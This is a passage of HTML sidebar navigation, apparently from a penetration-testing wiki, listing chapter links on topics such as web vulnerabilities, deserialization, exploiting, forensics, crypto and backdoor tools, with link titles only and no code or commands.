        <li class="chapter " data-level="6.66" data-path="../../pentesting/15672-pentesting-rabbitmq-management.html">
            
                <a href="../../pentesting/15672-pentesting-rabbitmq-management.html">
            
                    
                    15672 - Pentesting RabbitMQ Management
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.67" data-path="../../pentesting/27017-27018-mongodb.html">
            
                <a href="../../pentesting/27017-27018-mongodb.html">
            
                    
                    27017,27018 - Pentesting MongoDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.68" data-path="../../pentesting/44818-ethernetip.html">
            
                <a href="../../pentesting/44818-ethernetip.html">
            
                    
                    44818/UDP/TCP - Pentesting EthernetIP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.69" data-path="../../pentesting/47808-udp-bacnet.html">
            
                <a href="../../pentesting/47808-udp-bacnet.html">
            
                    
                    47808/udp - Pentesting BACNet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.70" data-path="../../pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html">
            
                <a href="../../pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html">
            
                    
                    50030,50060,50070,50075,50090 - Pentesting Hadoop
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Pentesting Web</li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../2fa-bypass.html">
            
                <a href="../2fa-bypass.html">
            
                    
                    2FA Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../abusing-hop-by-hop-headers.html">
            
                <a href="../abusing-hop-by-hop-headers.html">
            
                    
                    Abusing hop-by-hop headers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.3" data-path="../bypass-payment-process.html">
            
                <a href="../bypass-payment-process.html">
            
                    
                    Bypass Payment Process
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.4" data-path="../captcha-bypass.html">
            
                <a href="../captcha-bypass.html">
            
                    
                    Captcha Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.5" data-path="../cache-deception.html">
            
                <a href="../cache-deception.html">
            
                    
                    Cache Poisoning and Cache Deception
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.6" data-path="../clickjacking.html">
            
                <a href="../clickjacking.html">
            
                    
                    Clickjacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.7" data-path="../client-side-template-injection-csti.html">
            
                <a href="../client-side-template-injection-csti.html">
            
                    
                    Client Side Template Injection (CSTI)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.8" data-path="../command-injection.html">
            
                <a href="../command-injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.9" data-path="../content-security-policy-csp-bypass.html">
            
                <a href="../content-security-policy-csp-bypass.html">
            
                    
                    Content Security Policy (CSP) Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.10" data-path="../hacking-with-cookies.html">
            
                <a href="../hacking-with-cookies.html">
            
                    
                    Cookies Hacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.11" data-path="../cors-bypass.html">
            
                <a href="../cors-bypass.html">
            
                    
                    CORS - Misconfigurations & Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.12" data-path="../crlf-0d-0a.html">
            
                <a href="../crlf-0d-0a.html">
            
                    
                    CRLF (%0D%0A) Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.13" data-path="../cross-site-websocket-hijacking-cswsh.html">
            
                <a href="../cross-site-websocket-hijacking-cswsh.html">
            
                    
                    Cross-site WebSocket hijacking (CSWSH)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.14" data-path="../csrf-cross-site-request-forgery.html">
            
                <a href="../csrf-cross-site-request-forgery.html">
            
                    
                    CSRF (Cross Site Request Forgery)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.15" data-path="../dangling-markup-html-scriptless-injection.html">
            
                <a href="../dangling-markup-html-scriptless-injection.html">
            
                    
                    Dangling Markup - HTML scriptless injection
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="7.16" data-path="./">
            
                <a href="./">
            
                    
                    Deserialization
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.16.1" data-path="nodejs-deserialization-__proto__-abuse.html">
            
                <a href="nodejs-deserialization-__proto__-abuse.html">
            
                    
                    NodeJS deserialization __proto__ abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.2" data-path="java-jsf-viewstate-.faces-deserialization.html">
            
                <a href="java-jsf-viewstate-.faces-deserialization.html">
            
                    
                    Java JSF ViewState (.faces) Deserialization
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.3" data-path="java-dns-deserialization-and-gadgetprobe.html">
            
                <a href="java-dns-deserialization-and-gadgetprobe.html">
            
                    
                    Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.4" data-path="basic-java-deserialization-objectinputstream-readobject.html">
            
                <a href="basic-java-deserialization-objectinputstream-readobject.html">
            
                    
                    Basic Java Deserialization (ObjectInputStream, readObject)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.5" data-path="java-transformers-to-rutime-exec-payload.html">
            
                <a href="java-transformers-to-rutime-exec-payload.html">
            
                    
                    CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.6" data-path="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html">
            
                <a href="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html">
            
                    
                    Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.7" data-path="exploiting-__viewstate-parameter.html">
            
                <a href="exploiting-__viewstate-parameter.html">
            
                    
                    Exploiting __VIEWSTATE parameter
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.17" data-path="../email-header-injection.html">
            
                <a href="../email-header-injection.html">
            
                    
                    Email Header Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.18" data-path="../file-inclusion.html">
            
                <a href="../file-inclusion.html">
            
                    
                    File Inclusion/Path traversal
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.19" data-path="../file-upload/">
            
                <a href="../file-upload/">
            
                    
                    File Upload
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.19.1" data-path="../file-upload/pdf-upload-xxe-and-cors-bypass.md">
            
                <span>
            
                    
                    PDF Upload - XXE and CORS bypass
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.20" data-path="../http-request-smuggling.html">
            
                <a href="../http-request-smuggling.html">
            
                    
                    HTTP Request Smuggling / HTTP Desync Attack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.21" data-path="../idor.html">
            
                <a href="../idor.html">
            
                    
                    IDOR
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.22" data-path="../hacking-jwt-json-web-tokens.html">
            
                <a href="../hacking-jwt-json-web-tokens.html">
            
                    
                    JWT Vulnerabilities (Json Web Tokens)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.23" data-path="../nosql-injection.html">
            
                <a href="../nosql-injection.html">
            
                    
                    NoSQL injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.24" data-path="../ldap-injection.html">
            
                <a href="../ldap-injection.html">
            
                    
                    LDAP Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.25" data-path="../oauth-to-account-takeover.html">
            
                <a href="../oauth-to-account-takeover.html">
            
                    
                    OAuth to Account takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.26" data-path="../open-redirect.html">
            
                <a href="../open-redirect.html">
            
                    
                    Open Redirect
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.27" data-path="../parameter-pollution.html">
            
                <a href="../parameter-pollution.html">
            
                    
                    Parameter Pollution
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.28" data-path="../race-condition.html">
            
                <a href="../race-condition.html">
            
                    
                    Race Condition
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.29" data-path="../rate-limit-bypass.html">
            
                <a href="../rate-limit-bypass.html">
            
                    
                    Rate Limit Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30" data-path="../sql-injection/">
            
                <a href="../sql-injection/">
            
                    
                    SQL Injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.1" data-path="../sql-injection/mssql-injection.html">
            
                <a href="../sql-injection/mssql-injection.html">
            
                    
                    MSSQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.2" data-path="../sql-injection/oracle-injection.html">
            
                <a href="../sql-injection/oracle-injection.html">
            
                    
                    Oracle injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3" data-path="../sql-injection/postgresql-injection/">
            
                <a href="../sql-injection/postgresql-injection/">
            
                    
                    PostgreSQL injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.3.1" data-path="../sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration.html">
            
                <a href="../sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration.html">
            
                    
                    dblink/lo_import data exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.2" data-path="../sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html">
            
                <a href="../sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html">
            
                    
                    PL/pgSQL Password Bruteforce
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.3" data-path="../sql-injection/postgresql-injection/network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.html">
            
                <a href="../sql-injection/postgresql-injection/network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.html">
            
                    
                    Network - Privesc, Port Scanner and NTLM chanllenge response disclosure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.4" data-path="../sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html">
            
                <a href="../sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html">
            
                    
                    Big Binary Files Upload (PostgreSQL)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.5" data-path="../sql-injection/postgresql-injection/rce-with-postgresql-extensions.html">
            
                <a href="../sql-injection/postgresql-injection/rce-with-postgresql-extensions.html">
            
                    
                    RCE with PostgreSQL Extensions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.30.4" data-path="../sql-injection/mysql-injection/">
            
                <a href="../sql-injection/mysql-injection/">
            
                    
                    MySQL injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.4.1" data-path="../sql-injection/mysql-injection/mysql-ssrf.html">
            
                <a href="../sql-injection/mysql-injection/mysql-ssrf.html">
            
                    
                    Mysql SSRF
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.30.5" data-path="../sql-injection/sqlmap/">
            
                <a href="../sql-injection/sqlmap/">
            
                    
                    SQLMap - Cheetsheat
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.5.1" data-path="../sql-injection/sqlmap/second-order-injection-sqlmap.html">
            
                <a href="../sql-injection/sqlmap/second-order-injection-sqlmap.html">
            
                    
                    Second Order Injection - SQLMap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.31" data-path="../ssrf-server-side-request-forgery.html">
            
                <a href="../ssrf-server-side-request-forgery.html">
            
                    
                    SSRF (Server Side Request Forgery)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.32" data-path="../ssti-server-side-template-injection.html">
            
                <a href="../ssti-server-side-template-injection.html">
            
                    
                    SSTI (Server Side Template Injection)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.33" data-path="../domain-subdomain-takeover.html">
            
                <a href="../domain-subdomain-takeover.html">
            
                    
                    Domain/Subdomain takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.34" data-path="../unicode-normalization-vulnerability.html">
            
                <a href="../unicode-normalization-vulnerability.html">
            
                    
                    Unicode Normalization vulnerability
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.35" data-path="../web-tool-wfuzz.html">
            
                <a href="../web-tool-wfuzz.html">
            
                    
                    Web Tool - WFuzz
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.36" data-path="../xpath-injection.html">
            
                <a href="../xpath-injection.html">
            
                    
                    XPATH injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.37" data-path="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.html">
            
                <a href="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.html">
            
                    
                    XSLT Server Side Injection (Extensible Stylesheet Languaje Transformations)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.38" data-path="../xxe-xee-xml-external-entity.html">
            
                <a href="../xxe-xee-xml-external-entity.html">
            
                    
                    XXE - XEE - XML External Entity
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39" data-path="../xss-cross-site-scripting/">
            
                <a href="../xss-cross-site-scripting/">
            
                    
                    XSS (Cross Site Scripting)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.39.1" data-path="../xss-cross-site-scripting/dom-xss.html">
            
                <a href="../xss-cross-site-scripting/dom-xss.html">
            
                    
                    DOM XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39.2" data-path="../xss-cross-site-scripting/server-side-xss-dynamic-pdf.html">
            
                <a href="../xss-cross-site-scripting/server-side-xss-dynamic-pdf.html">
            
                    
                    Server Side XSS (Dynamic PDF)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39.3" data-path="../xss-cross-site-scripting/xss-tools.html">
            
                <a href="../xss-cross-site-scripting/xss-tools.html">
            
                    
                    XSS Tools
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.40" data-path="../xssi-cross-site-script-inclusion.html">
            
                <a href="../xssi-cross-site-script-inclusion.html">
            
                    
                    XSSI (Cross-Site Script Inclusion)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.41" data-path="../xs-search.html">
            
                <a href="../xs-search.html">
            
                    
                    XS-Search
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Physical attacks</li>
        
        
    
        <li class="chapter " data-level="8.1" data-path="../../physical-attacks/physical-attacks.html">
            
                <a href="../../physical-attacks/physical-attacks.html">
            
                    
                    Physical Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.2" data-path="../../physical-attacks/escaping-from-gui-applications/">
            
                <a href="../../physical-attacks/escaping-from-gui-applications/">
            
                    
                    Escaping from KIOSKs
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.2.1" data-path="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html">
            
                <a href="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html">
            
                    
                    Show file extensions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Exploiting</li>
        
        
    
        <li class="chapter " data-level="9.1" data-path="../../exploiting/linux-exploiting-basic-esp/">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/">
            
                    
                    Linux Exploiting (Basic) (SPA)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.1.1" data-path="../../exploiting/linux-exploiting-basic-esp/rop-syscall-execv.html">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/rop-syscall-execv.html">
            
                    
                    ROP - Syscall execv
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.2" data-path="../../exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address.html">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address.html">
            
                    
                    ROP - Leaking LIBC address
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.3" data-path="../../exploiting/linux-exploiting-basic-esp/bypassing-canary-and-pie.html">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/bypassing-canary-and-pie.html">
            
                    
                    Bypassing Canary & PIE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.4" data-path="../../exploiting/linux-exploiting-basic-esp/ret2lib.html">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/ret2lib.html">
            
                    
                    Ret2Lib
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.5" data-path="../../exploiting/linux-exploiting-basic-esp/fusion.html">
            
                <a href="../../exploiting/linux-exploiting-basic-esp/fusion.html">
            
                    
                    Fusion
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.2" data-path="../../exploiting/tools/">
            
                <a href="../../exploiting/tools/">
            
                    
                    Exploiting Tools
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.2.1" data-path="../../exploiting/tools/pwntools.html">
            
                <a href="../../exploiting/tools/pwntools.html">
            
                    
                    PwnTools
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.3" data-path="../../exploiting/windows-exploiting-basic-guide-oscp-lvl.html">
            
                <a href="../../exploiting/windows-exploiting-basic-guide-oscp-lvl.html">
            
                    
                    Windows Exploiting (Basic Guide - OSCP lvl)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.4" data-path="../../exploiting/reversing.html">
            
                <a href="../../exploiting/reversing.html">
            
                    
                    Reversing
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Forensics</li>
        
        
    
        <li class="chapter " data-level="10.1" data-path="../../forensics/malware-analysis.html">
            
                <a href="../../forensics/malware-analysis.html">
            
                    
                    Malware Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.2" data-path="../../forensics/memory-dump-analysis.html">
            
                <a href="../../forensics/memory-dump-analysis.html">
            
                    
                    Memory dump analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3" data-path="../../forensics/pcaps-analysis/">
            
                <a href="../../forensics/pcaps-analysis/">
            
                    
                    Pcaps analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="10.3.1" data-path="../../forensics/pcaps-analysis/usb-keyboard-pcap-analysis.html">
            
                <a href="../../forensics/pcaps-analysis/usb-keyboard-pcap-analysis.html">
            
                    
                    USB Keyboard pcap analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3.2" data-path="../../forensics/pcaps-analysis/dnscat-exfiltration.html">
            
                <a href="../../forensics/pcaps-analysis/dnscat-exfiltration.html">
            
                    
                    DNSCat pcap analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3.3" data-path="../../forensics/pcaps-analysis/wireshark-tricks.html">
            
                <a href="../../forensics/pcaps-analysis/wireshark-tricks.html">
            
                    
                    WireShark tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="10.4" data-path="../../forensics/volatility-examples.html">
            
                <a href="../../forensics/volatility-examples.html">
            
                    
                    Volatility - Examples
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5" data-path="../../forensics/basic-forensics-esp/">
            
                <a href="../../forensics/basic-forensics-esp/">
            
                    
                    Basic Forensics (ESP)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="10.5.1" data-path="../../forensics/basic-forensics-esp/usb-logs-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/usb-logs-analysis.html">
            
                    
                    USB logs analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.2" data-path="../../forensics/basic-forensics-esp/desofuscation-vbs-cscript.exe.html">
            
                <a href="../../forensics/basic-forensics-esp/desofuscation-vbs-cscript.exe.html">
            
                    
                    Desofuscation vbs (cscript.exe)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.3" data-path="../../forensics/basic-forensics-esp/.pyc.html">
            
                <a href="../../forensics/basic-forensics-esp/.pyc.html">
            
                    
                    .pyc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.4" data-path="../../forensics/basic-forensics-esp/office-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/office-file-analysis.html">
            
                    
                    Office file analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.5" data-path="../../forensics/basic-forensics-esp/video-and-audio-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/video-and-audio-file-analysis.html">
            
                    
                    Video and Audio file analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.6" data-path="../../forensics/basic-forensics-esp/pdf-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/pdf-file-analysis.html">
            
                    
                    PDF File analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.7" data-path="../../forensics/basic-forensics-esp/file-system-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/file-system-analysis.html">
            
                    
                    File System Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.8" data-path="../../forensics/basic-forensics-esp/png-tricks.html">
            
                <a href="../../forensics/basic-forensics-esp/png-tricks.html">
            
                    
                    PNG tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.9" data-path="../../forensics/basic-forensics-esp/zips-tricks.html">
            
                <a href="../../forensics/basic-forensics-esp/zips-tricks.html">
            
                    
                    ZIPs tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Crypto</li>
        
        
    
        <li class="chapter " data-level="11.1" data-path="../../crypto/certificates.html">
            
                <a href="../../crypto/certificates.html">
            
                    
                    Certificates
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.2" data-path="../../crypto/electronic-code-book-ecb.html">
            
                <a href="../../crypto/electronic-code-book-ecb.html">
            
                    
                    Electronic Code Book (ECB)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.3" data-path="../../crypto/cipher-block-chaining-cbc-mac-priv.html">
            
                <a href="../../crypto/cipher-block-chaining-cbc-mac-priv.html">
            
                    
                    Cipher Block Chaining CBC-MAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.4" data-path="../../crypto/padding-oracle-priv.html">
            
                <a href="../../crypto/padding-oracle-priv.html">
            
                    
                    Padding Oracle
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.5" data-path="../../crypto/rc4-encrypt-and-decrypt.html">
            
                <a href="../../crypto/rc4-encrypt-and-decrypt.html">
            
                    
                    RC4 - Encrypt&Decrypt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.6" data-path="../../crypto/crypto-ctfs-tricks.html">
            
                <a href="../../crypto/crypto-ctfs-tricks.html">
            
                    
                    Crypto CTFs Tricks
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">BACKDOORS</li>
        
        
    
        <li class="chapter " data-level="12.1" data-path="../../backdoors/merlin.html">
            
                <a href="../../backdoors/merlin.html">
            
                    
                    Merlin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.2" data-path="../../backdoors/empire.html">
            
                <a href="../../backdoors/empire.html">
            
                    
                    Empire
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.3" data-path="../../backdoors/salseo.html">
            
                <a href="../../backdoors/salseo.html">
            
                    
                    Salseo
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.4" data-path="../../backdoors/icmpsh.html">
            
                <a href="../../backdoors/icmpsh.html">
            
                    
                    ICMPsh
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Stego</li>
        
        
    
        <li class="chapter " data-level="13.1" data-path="../../stego/stego-tricks.html">
            
                <a href="../../stego/stego-tricks.html">
            
                    
                    Stego Tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="13.2" data-path="../../stego/esoteric-languages.html">
            
                <a href="../../stego/esoteric-languages.html">
            
                    
                    Esoteric languages
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">MISC</li>
        
        
    
        <li class="chapter " data-level="14.1" data-path="../../misc/basic-python/">
            
                <a href="../../misc/basic-python/">
            
                    
                    Basic Python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="14.1.1" data-path="../../misc/basic-python/venv.html">
            
                <a href="../../misc/basic-python/venv.html">
            
                    
                    venv
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.2" data-path="../../misc/basic-python/bypass-python-sandboxes.html">
            
                <a href="../../misc/basic-python/bypass-python-sandboxes.html">
            
                    
                    Bypass Python sandboxes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.3" data-path="../../misc/basic-python/magic-methods.html">
            
                <a href="../../misc/basic-python/magic-methods.html">
            
                    
                    Magic Methods
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.4" data-path="../../misc/basic-python/web-requests.html">
            
                <a href="../../misc/basic-python/web-requests.html">
            
                    
                    Web Requests
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.5" data-path="../../misc/basic-python/bruteforce-hash-few-chars.html">
            
                <a href="../../misc/basic-python/bruteforce-hash-few-chars.html">
            
                    
                    Bruteforce hash (few chars)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.6" data-path="../../misc/basic-python/rop-pwn-template.html">
            
                <a href="../../misc/basic-python/rop-pwn-template.html">
            
                    
                    ROP-PWN template
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="14.2" data-path="../../misc/references.html">
            
                <a href="../../misc/references.html">
            
                    
                    Other Big References
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">TODO</li>
        
        
    
        <li class="chapter " data-level="15.1" data-path="../../todo/more-tools.html">
            
                <a href="../../todo/more-tools.html">
            
                    
                    More Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="15.2" data-path="../../todo/misc.html">
            
                <a href="../../todo/misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="15.3" data-path="../../todo/pentesting-dns.html">
            
                <a href="../../todo/pentesting-dns.html">
            
                    
                    Pentesting DNS
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="16.1" data-path="../../general/burp-suite.html">
            
                <a href="../../general/burp-suite.html">
            
                    
                    Burp Suite
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.2" data-path="../../general/other-web-tricks.html">
            
                <a href="../../general/other-web-tricks.html">
            
                    
                    Other Web Tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.3" data-path="../../general/interesting-http.html">
            
                <a href="../../general/interesting-http.html">
            
                    
                    Interesting HTTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.4" data-path="../../general/emails-vulns.html">
            
                <a href="../../general/emails-vulns.html">
            
                    
                    Emails Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.5" data-path="../../general/cloud-security-review.html">
            
                <a href="../../general/cloud-security-review.html">
            
                    
                    Cloud security review
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.6" data-path="../../general/android-forensics.md">
            
                <span>
            
                    
                    Android Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.7" data-path="../../general/tr-069.html">
            
                <a href="../../general/tr-069.html">
            
                    
                    TR-069
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.8" data-path="../../general/6881-udp-pentesting-bittorrent.html">
            
                <a href="../../general/6881-udp-pentesting-bittorrent.html">
            
                    
                    6881/udp - Pentesting BitTorrent
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.9" data-path="../../ctf-write-ups/">
            
                <a href="../../ctf-write-ups/">
            
                    
                    CTF Write-ups
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="16.9.1" data-path="../../ctf-write-ups/try-hack-me/">
            
                <a href="../../ctf-write-ups/try-hack-me/">
            
                    
                    Try Hack Me
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="16.9.1.1" data-path="../../ctf-write-ups/try-hack-me/hc0n-christmas-ctf-2019.html">
            
                <a href="../../ctf-write-ups/try-hack-me/hc0n-christmas-ctf-2019.html">
            
                    
                    hc0n Christmas CTF - 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.9.1.2" data-path="../../ctf-write-ups/try-hack-me/pickle-rick.html">
            
                <a href="../../ctf-write-ups/try-hack-me/pickle-rick.html">
            
                    
                    Pickle Rick
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="16.10" data-path="../../general/1911-pentesting-fox.html">
            
                <a href="../../general/1911-pentesting-fox.html">
            
                    
                    1911 - Pentesting fox
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.11" data-path="../../general/online-platforms-with-api.html">
            
                <a href="../../general/online-platforms-with-api.html">
            
                    
                    Online Platforms with API
            
                </a>
            

            
        </li>
    
